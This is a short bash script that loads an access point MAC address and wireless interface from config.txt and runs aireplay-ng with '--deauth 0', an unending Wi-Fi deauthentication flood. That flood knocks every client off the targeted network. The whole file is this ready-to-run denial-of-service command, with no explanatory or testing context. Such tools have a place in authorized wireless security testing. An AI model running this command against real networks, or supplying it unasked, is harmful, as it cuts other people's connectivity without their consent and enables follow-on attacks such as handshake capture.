#!/bin/bash

source config.txt

aireplay-ng --deauth 0 -a $ap_mac $interface
